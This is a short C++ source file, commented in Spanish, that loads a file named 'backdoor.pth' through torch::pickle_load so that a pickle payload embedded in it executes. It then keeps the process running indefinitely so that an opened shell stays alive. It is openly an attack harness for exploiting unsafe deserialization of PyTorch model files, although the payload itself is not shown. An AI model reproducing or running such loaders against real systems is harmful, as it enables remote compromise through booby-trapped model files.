// loader_fixed.cpp - Carga .pth usando torch::pickle_load para evitar jit::load
#include <torch/torch.h>
#include <c10/core/TensorTypeId.h>  // Para definir operator==
#include <iostream>
#include <fstream>
#include <chrono>
#include <thread>

int main() {
    std::cout << "[*] Cargando backdoor desde C++ con pickle_load" << std::endl;

    // Leer el archivo .pth como un buffer de bytes
    std::ifstream file("backdoor.pth", std::ios::binary);
    if (!file) {
        std::cerr << "[-] No se pudo abrir el archivo .pth" << std::endl;
        return 1;
    }
    file.seekg(0, std::ios::end);
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<char> buffer(size);
    file.read(buffer.data(), size);
    file.close();

    // Deserializar con pickle_load (esto ejecutará el payload)
    try {
        torch::IValue ivalue = torch::pickle_load(buffer);
        std::cout << "[+] Pickle cargado correctamente. Payload ejecutado." << std::endl;
    } catch (const std::exception& e) {
        std::cerr << "[-] Error durante pickle_load: " << e.what() << std::endl;
        return 1;
    }

    // Mantener el proceso vivo para que la shell no se cierre
    std::cout << "[*] Manteniendo proceso activo..." << std::endl;
    while (true) {
        std::this_thread::sleep_for(std::chrono::minutes(1));
    }

    return 0;
}